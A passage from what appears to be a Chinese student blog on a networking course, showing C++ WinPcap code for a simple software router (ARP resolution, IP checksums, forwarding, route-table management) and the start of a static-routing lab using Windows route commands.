class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">write2log_ip</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* a,Data_t*)</span></span>;<span class="comment">//ip类型</span></span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>;<span class="comment">//打印日志</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">arpitem</span>//<span class="title">arp</span>日志为<span class="title">ip</span>和对应<span class="title">MAC</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	DWORD ip;</span><br><span class="line">	BYTE mac[<span class="number">6</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ipitem</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	DWORD sip, dip;<span class="comment">//ip日志为源和目的的IP和mac</span></span><br><span class="line">	BYTE smac[<span class="number">6</span>], dmac[<span class="number">6</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取自己的IP</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_alldevs</span><span class="params">()</span></span>;	<span class="comment">//获取本机的设备列表，将两个ip存入ip数组中,获取IP、mask，计算所在网段</span></span><br><span class="line"><span class="function">DWORD <span class="title">getnet</span><span class="params">(DWORD ip, DWORD mask)</span></span>;<span class="comment">//根据ip和掩码计算所在网络</span></span><br><span class="line"><span class="comment">//打开网络接口</span></span><br><span class="line"><span class="function"><span class="keyword">pcap_t</span>* <span class="title">open</span><span class="params">(<span class="keyword">char</span>* name)</span></span>;</span><br><span class="line"><span class="comment">//获取自己的MAC</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getselfmac</span><span class="params">(DWORD ip)</span></span>;</span><br><span class="line"><span class="comment">//获取直接连接的网卡mac</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getothermac</span><span class="params">(DWORD mask_, DWORD ip, BYTE mac[])</span></span>;</span><br><span class="line"><span class="comment">//显示基本信息 本机ip，mac</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printbasicinfo</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//数据报转发,修改源mac和目的mac</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">resend</span><span class="params">(ICMP_t, BYTE dmac[])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印mac</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getmac</span><span class="params">(BYTE MAC[])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">handlerRequest</span><span class="params">(LPVOID lparam)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ipprint</span><span class="params">(DWORD ip)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查和设置校验和</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkchecksum</span><span class="params">(Data_t*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setchecksum</span><span class="params">(Data_t*)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>find_alldevs获取本机网卡的IP</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_alldevs</span><span class="params">()</span>	<span class="comment">//获取网卡上的IP</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取网卡列表</span></span><br><span class="line">	<span class="keyword">if</span> (pcap_findalldevs_ex(pcap_src_if_string, <span class="literal">NULL</span>, &amp;alldevs, errbuf) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%s"</span>, <span class="string">"error"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		d = alldevs;</span><br><span class="line">		<span class="comment">//获取该网络接口设备的ip地址信息</span></span><br><span class="line">		<span class="keyword">for</span> (; d != <span class="literal">NULL</span>; d = d-&gt;next)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (i == index)</span><br><span class="line">			&#123;</span><br><span class="line">				net[i] = d;</span><br><span class="line">				<span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">for</span> (a = d-&gt;addresses; a != <span class="literal">nullptr</span>; a = a-&gt;next)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (((struct sockaddr_in*)a-&gt;addr)-&gt;sin_family == AF_INET &amp;&amp; a-&gt;addr)</span><br><span class="line">					&#123;</span><br><span class="line">                        <span class="comment">//将对应第index块网卡的内容存入全局数组</span></span><br><span class="line">						<span class="built_in">strcpy</span>(ip[t], inet_ntoa(((struct sockaddr_in*)a-&gt;addr)-&gt;sin_addr));</span><br><span class="line">						<span class="built_in">strcpy</span>(mask[t++], inet_ntoa(((struct sockaddr_in*)a-&gt;netmask)-&gt;sin_addr));</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				ahandle = <span class="built_in">open</span>(d-&gt;name);<span class="comment">//打开该网卡</span></span><br><span class="line">			&#125;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	pcap_freealldevs(alldevs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>open打开网络接口</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pcap_t</span>* <span class="title">open</span><span class="params">(<span class="keyword">char</span>* name)</span><span class="comment">//打开网络接口，返回网卡指针</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pcap_t</span>* temp = pcap_open(name, <span class="number">65536</span>, PCAP_OPENFLAG_PROMISCUOUS, <span class="number">100</span>, <span class="literal">NULL</span>, errbuf);</span><br><span class="line">	<span class="keyword">if</span> (temp == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>==getselfmac和getothermac获取MAC地址==</strong></p>
<p>由于获取本机的MAC和其它机器的MAC地址逻辑相似，这里只详细说明一个</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getothermac</span><span class="params">(DWORD ip_, BYTE mac[])</span><span class="comment">//获取ip对应的mac</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(mac, <span class="number">0</span>, <span class="keyword">sizeof</span>(mac));</span><br><span class="line">	ARPFrame_t ARPFrame;</span><br><span class="line">	<span class="comment">//将APRFrame.FrameHeader.DesMAC设置为广播地址</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">		ARPFrame.FrameHeader.DesMAC[i] = <span class="number">0xff</span>;</span><br><span class="line">	<span class="comment">//将APRFrame.FrameHeader.SrcMAC设置为本机网卡的MAC地址，若获取本机MAC，则伪造一个即可</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ARPFrame.FrameHeader.SrcMAC[i] = selfmac[i];</span><br><span class="line">		ARPFrame.SendHa[i] = selfmac[i];</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ARPFrame.FrameHeader.FrameType = htons(<span class="number">0x806</span>);<span class="comment">//帧类型为ARP</span></span><br><span class="line">	ARPFrame.HardwareType = htons(<span class="number">0x0001</span>);<span class="comment">//硬件类型为以太网</span></span><br><span class="line">	ARPFrame.ProtocolType = htons(<span class="number">0x0800</span>);<span class="comment">//协议类型为IP</span></span><br><span class="line">	ARPFrame.HLen = <span class="number">6</span>;<span class="comment">//硬件地址长度为6</span></span><br><span class="line">	ARPFrame.PLen = <span class="number">4</span>;<span class="comment">//协议地址长为4</span></span><br><span class="line">	ARPFrame.Operation = htons(<span class="number">0x0001</span>);<span class="comment">//操作为ARP请求</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//将ARPFrame.SendIP设置为本机网卡上绑定的IP地址，若获取本机MAC，则伪造发送IP和MAC</span></span><br><span class="line">	ARPFrame.SendIP = inet_addr(ip[<span class="number">0</span>]);</span><br><span class="line">	<span class="comment">//ipprint(ARPFrame.SendIP);</span></span><br><span class="line">	<span class="comment">//将ARPFrame.RecvHa设置为0</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">		ARPFrame.RecvHa[i] = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//将ARPFrame.RecvIP设置为请求的IP地址</span></span><br><span class="line">	ARPFrame.RecvIP = ip_;</span><br><span class="line"></span><br><span class="line">	u_char* h = (u_char*)&amp;ARPFrame;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="keyword">sizeof</span>(ARPFrame_t);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ahandle == <span class="literal">nullptr</span>) <span class="built_in">printf</span>(<span class="string">"网卡接口打开错误\n"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (pcap_sendpacket(ahandle, (u_char*)&amp;ARPFrame, <span class="keyword">sizeof</span>(ARPFrame_t)) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//发送错误处理</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"senderror\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//发送成功</span></span><br><span class="line">			<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				pcap_pkthdr* pkt_header;</span><br><span class="line">				<span class="keyword">const</span> u_char* pkt_data;</span><br><span class="line">				<span class="keyword">int</span> rtn = pcap_next_ex(ahandle, &amp;pkt_header, &amp;pkt_data);<span class="comment">//捕获数据报</span></span><br><span class="line">				<span class="keyword">if</span> (rtn == <span class="number">1</span>)<span class="comment">//捕获到数据报</span></span><br><span class="line">				&#123;</span><br><span class="line">					ARPFrame_t* IPPacket = (ARPFrame_t*)pkt_data;</span><br><span class="line">					<span class="keyword">if</span> (ntohs(IPPacket-&gt;FrameHeader.FrameType) == <span class="number">0x806</span>)<span class="comment">//筛选ARP类型的消息进行处理</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span> (!compare(IPPacket-&gt;FrameHeader.SrcMAC, ARPFrame.FrameHeader.SrcMAC) &amp;&amp; compare(IPPacket-&gt;FrameHeader.DesMAC, ARPFrame.FrameHeader.SrcMAC) &amp;&amp; IPPacket-&gt;SendIP == ip_)<span class="comment">//消息筛选</span></span><br><span class="line">						&#123;</span><br><span class="line">							ltable.write2log_arp(IPPacket);</span><br><span class="line">							<span class="comment">//源MAC地址即为所需MAC地址</span></span><br><span class="line">							<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">							&#123;</span><br><span class="line">								mac[i] = IPPacket-&gt;FrameHeader.SrcMAC[i];</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">break</span>;<span class="comment">//已经捕获到MAC，可以退出函数</span></span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>==setchecksum和checkchecesum设置校验和和检验校验和==</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setchecksum</span><span class="params">(Data_t* temp)</span><span class="comment">//设置校验和</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	temp-&gt;IPHeader.Checksum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	WORD* t = (WORD*)&amp;temp-&gt;IPHeader;<span class="comment">//每16位为一组</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(IPHeader_t)/<span class="number">2</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		sum += t[i];</span><br><span class="line">		<span class="keyword">while</span> (sum &gt;= <span class="number">0x10000</span>)<span class="comment">//如果溢出，则进行回卷</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> s = sum &gt;&gt; <span class="number">16</span>;</span><br><span class="line">			sum -= <span class="number">0x10000</span>;</span><br><span class="line">			sum += s;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	temp-&gt;IPHeader.Checksum = ~sum;<span class="comment">//结果取反</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkchecksum</span><span class="params">(Data_t* temp)</span><span class="comment">//检验</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	WORD* t = (WORD*)&amp;temp-&gt;IPHeader;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(IPHeader_t) / <span class="number">2</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		sum += t[i];</span><br><span class="line">		<span class="keyword">while</span> (sum &gt;= <span class="number">0x10000</span>)<span class="comment">//包含原有校验和一起进行相加</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> s = sum &gt;&gt; <span class="number">16</span>;</span><br><span class="line">			sum -= <span class="number">0x10000</span>;</span><br><span class="line">			sum += s;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (sum == <span class="number">65535</span>)<span class="comment">//源码+反码-》全1</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//校验和正确</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>==接收和处理线程函数==</strong></p>
<p>为使消息转发和路由表添加、删除、打印等操作可以同时进行，使用线程函数进行消息内容处理</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">handlerRequest</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	routetable rtable = *(routetable*)(LPVOID)lparam;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		pcap_pkthdr* pkt_header; <span class="keyword">const</span> u_char* pkt_data;</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> rtn = pcap_next_ex(ahandle, &amp;pkt_header, &amp;pkt_data);</span><br><span class="line">			<span class="keyword">if</span> (rtn)<span class="keyword">break</span>;<span class="comment">//接收到消息</span></span><br><span class="line">		&#125;</span><br><span class="line">		FrameHeader_t* header = (FrameHeader_t*)pkt_data;</span><br><span class="line">		<span class="keyword">if</span> (compare(header-&gt;DesMAC, selfmac))<span class="comment">//目的mac是自己的mac</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (ntohs(header-&gt;FrameType) == <span class="number">0x800</span>)<span class="comment">//IP格式的数据报</span></span><br><span class="line">			&#123;</span><br><span class="line">				Data_t* data = (Data_t*)pkt_data;</span><br><span class="line">				ltable.write2log_ip(<span class="string">"接收"</span>, data);<span class="comment">//将接收内容写入日志</span></span><br><span class="line"></span><br><span class="line">				DWORD ip1_ = data-&gt;IPHeader.DstIP;</span><br><span class="line">				DWORD ip_ = rtable.lookup(ip1_);<span class="comment">//查找路由表中是否有对应表项</span></span><br><span class="line">				<span class="keyword">if</span>(ip_==<span class="number">-1</span>)<span class="keyword">continue</span>;<span class="comment">//如果没有则直接丢弃或直接递交至上层</span></span><br><span class="line">				<span class="keyword">if</span> (checkchecksum(data))<span class="comment">//如果校验和不正确，则直接丢弃不进行处理</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (data-&gt;IPHeader.DstIP != inet_addr(ip[<span class="number">0</span>]) &amp;&amp; data-&gt;IPHeader.DstIP != inet_addr(ip[<span class="number">1</span>]))</span><br><span class="line">					&#123;</span><br><span class="line">                        <span class="comment">//不是广播消息</span></span><br><span class="line">						<span class="keyword">int</span> t1 = compare(data-&gt;FrameHeader.DesMAC, broadcast);</span><br><span class="line">						<span class="keyword">int</span> t2 = compare(data-&gt;FrameHeader.SrcMAC, broadcast);</span><br><span class="line">						<span class="keyword">if</span> (!t1 &amp;&amp; !t2)</span><br><span class="line">						&#123;</span><br><span class="line">                            <span class="comment">//ICMP报文包含IP数据包报头和其它内容</span></span><br><span class="line">							ICMP_t* temp_ = (ICMP_t*)pkt_data;</span><br><span class="line">							ICMP_t temp = *temp_;</span><br><span class="line">							BYTE mac[<span class="number">6</span>];</span><br><span class="line">							<span class="keyword">if</span>(ip_==<span class="number">0</span>)<span class="comment">//直接投递，查找目的IP的MAc</span></span><br><span class="line">							&#123;</span><br><span class="line">                                <span class="comment">//如果ARP表中没有所需内容，则需要获取ARP</span></span><br><span class="line">								<span class="keyword">if</span> (!arptable::lookup(ip1_, mac))</span><br><span class="line">									arptable::insert(ip1_, mac);</span><br><span class="line">								resend(temp, mac);<span class="comment">//转发</span></span><br><span class="line">							&#125;</span><br><span class="line"></span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span> (ip_ != <span class="number">-1</span>)<span class="comment">//非直接投递，查找下一条IP的MAC</span></span><br><span class="line">							&#123;</span><br><span class="line">								<span class="keyword">if</span> (!arptable::lookup(ip_, mac))</span><br><span class="line">									arptable::insert(ip_, mac);</span><br><span class="line">								resend(temp, mac);</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>==resend消息转发==</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数据报转发,修改源mac和目的mac</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">resend</span><span class="params">(ICMP_t data, BYTE dmac[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Data_t* temp=(Data_t*)&amp;data;</span><br><span class="line">	<span class="built_in">memcpy</span>(temp-&gt;FrameHeader.SrcMAC, temp-&gt;FrameHeader.DesMAC, <span class="number">6</span>);<span class="comment">//源MAC为本机MAC</span></span><br><span class="line">	<span class="built_in">memcpy</span>(temp-&gt;FrameHeader.DesMAC, dmac, <span class="number">6</span>);<span class="comment">//目的MAC为下一跳MAC</span></span><br><span class="line">	temp-&gt;IPHeader.TTL -= <span class="number">1</span>;<span class="comment">//TTL-1</span></span><br><span class="line">	<span class="keyword">if</span> (temp-&gt;IPHeader.TTL &lt; <span class="number">0</span>)<span class="keyword">return</span>;<span class="comment">//丢弃</span></span><br><span class="line">	setchecksum(temp);<span class="comment">//重新设置校验和</span></span><br><span class="line">	<span class="keyword">int</span> rtn = pcap_sendpacket(ahandle, (<span class="keyword">const</span> u_char*)temp, <span class="number">74</span>);<span class="comment">//发送数据报</span></span><br><span class="line">	<span class="keyword">if</span> (rtn == <span class="number">0</span>)</span><br><span class="line">		ltable.write2log_ip(<span class="string">"转发"</span>,temp);<span class="comment">//写入日志</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ip打印</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ipprint</span><span class="params">(DWORD ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	in_addr addr;</span><br><span class="line">	addr.s_addr = ip;</span><br><span class="line">	<span class="keyword">char</span>* pchar = inet_ntoa(addr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\t"</span>, pchar);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>getmac打印MAC</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getmac</span><span class="params">(BYTE MAC[])</span><span class="comment">//打印mac</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"MAC地址为： "</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%02X-"</span>, MAC[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%02X\n"</span>, MAC[<span class="number">5</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>路由表添加</strong></p>
<p>为方便寻找<strong>最长前缀表项</strong>，在插入时对掩码进行排序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">routetable::add</span><span class="params">(routeitem* a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	routeitem* pointer;</span><br><span class="line">	<span class="comment">//找到合适的地方</span></span><br><span class="line">	<span class="comment">//默认路由,一定是最开始的时候添加</span></span><br><span class="line">	<span class="keyword">if</span> (!a-&gt;type)<span class="comment">//直接投递</span></span><br><span class="line">	&#123;</span><br><span class="line">		a-&gt;nextitem = head-&gt;nextitem;</span><br><span class="line">		head-&gt;nextitem = a;</span><br><span class="line">		a-&gt;type = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//其它，按照掩码由长至短找到合适的位置</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (pointer = head-&gt;nextitem; pointer != tail &amp;&amp; pointer-&gt;nextitem != tail; pointer = pointer-&gt;nextitem)<span class="comment">//head有内容，tail没有</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a-&gt;mask &lt; pointer-&gt;mask &amp;&amp; a-&gt;mask &gt;= pointer-&gt;nextitem-&gt;mask || pointer-&gt;nextitem == tail)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		a-&gt;nextitem = pointer-&gt;nextitem;</span><br><span class="line">		pointer-&gt;nextitem = a;<span class="comment">//插入到合适位置</span></span><br><span class="line">		<span class="comment">//a-&gt;type = 1;</span></span><br><span class="line">	&#125;</span><br><span class="line">	routeitem* p = head-&gt;nextitem;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; p != tail; p = p-&gt;nextitem, i++)</span><br><span class="line">	&#123;</span><br><span class="line">		p-&gt;index = i;</span><br><span class="line">	&#125;</span><br><span class="line">	num++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>路由表删除</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">routetable::remove</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (routeitem* t = head; t-&gt;nextitem != tail; t = t-&gt;nextitem)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (t-&gt;nextitem-&gt;index == index)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (t-&gt;nextitem-&gt;type == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"该项不可删除\n"</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				t-&gt;nextitem = t-&gt;nextitem-&gt;nextitem;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"无该表项\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ul>
<li>收到ping数据报但是不回复<ul>
<li>可能使校验和设置错误，消息被接收方丢弃了</li>
</ul>
</li>
<li>第一条能ping通，后面三条显示超时<ul>
<li>处理了大量其它的消息，占用CPU资源，将筛选提前</li>
</ul>
</li>
<li>ARP请求到的MAC是其它电脑的MAC<ul>
<li>注意筛选收到的ARP请求的发送方IP</li>
</ul>
</li>
<li>ping发送方显示无法访问目标网络<ul>
<li>打开运行路由器的主机中的routing and remote服务</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>wpcap</tag>
        <tag>大三上学期课程内容</tag>
        <tag>网络技术与应用</tag>
      </tags>
  </entry>
  <entry>
    <title>网络技术与应用作业五 互联网组网与路由器配置</title>
    <url>/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="验证性实验（3）互联网组网与路由器配置"><a href="#验证性实验（3）互联网组网与路由器配置" class="headerlink" title="验证性实验（3）互联网组网与路由器配置"></a>验证性实验（3）互联网组网与路由器配置</h1><h2 id="实验内容说明"><a href="#实验内容说明" class="headerlink" title="实验内容说明"></a>实验内容说明</h2><ol>
<li>实体环境下互联网组网与路由器配置</li>
</ol>
<p>在实体环境下完成互联网组网与路由器配置，要求如下：（1）在机房实验室环境下，通过将局域网划分为不同子网，用多IP主机作为路由器，组建互联网。（2）在命令行方式下，按照静态路由方式，配置路由器和主机，测试互联网的连通性。</p>
<ol start="2">
<li>仿真环境下的互联网组网与路由器配置</li>
</ol>
<p>在仿真环境下完成互联网组网与路由器配置，要求如下：（1）学习路由器的配置方法和配置命令。（2）参考实体实验，组建由多个路由器组成的互联网。物理网络可以由集线器、交换机构成。（3）按照静态路由方式配置路由器和主机，测试互联网的连通性。（4）利用动态路由方式配置路由器和主机，测试互联网的连通性。（5）在仿真环境的“模拟”方式中观察数据包在互联网中的传递过程，并进行分析。</p>
<ol start="3">
<li>在仿真环境下完成下面实验</li>
</ol>
<p>校园网用户的主机中安装有两块网卡，一块无线网卡通过带路由功能的AP接入Internet，一块网卡通过交换机直接接入校园网。假设校园网拥有的IP地址为202.118.25.xx，202.118.26.xx，202.118.27.xx，202.118.28.xx，202.118.29.xx，202.118.30.xx。配置用户的主机，使其通过学校交换机和路由器访问校园内的所有联网主机，通过带路由功能的AP访问其他Internet。</p>
<h2 id="实验一：-实体环境下互联网组网与路由器配置"><a href="#实验一：-实体环境下互联网组网与路由器配置" class="headerlink" title="实验一： 实体环境下互联网组网与路由器配置"></a>实验一： 实体环境下互联网组网与路由器配置</h2><h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>在机房使用四台电脑完成实验，其中两台作为路由器，另外两台作为主机</p>
<p>配置信息：</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第五次实验/image-20201212212922371.png"  alt="image-20201212212922371" style="zoom: 25%;">

<ul>
<li>使用<code>route PRINT</code>指令可以看到当前路由表信息</li>
<li>使用<code>route ADD 目标网络 MASK 目标网络掩码 下一跳IP地址</code>添加路由表表项</li>
<li>使用<code>route CHANGE 目标网络 MASK 目标网络掩码 下一跳IP地址</code>修改路由表表项</li>
<li>使用<code>route DELETE 目标网络</code>可以删除路由表</li>
</ul>
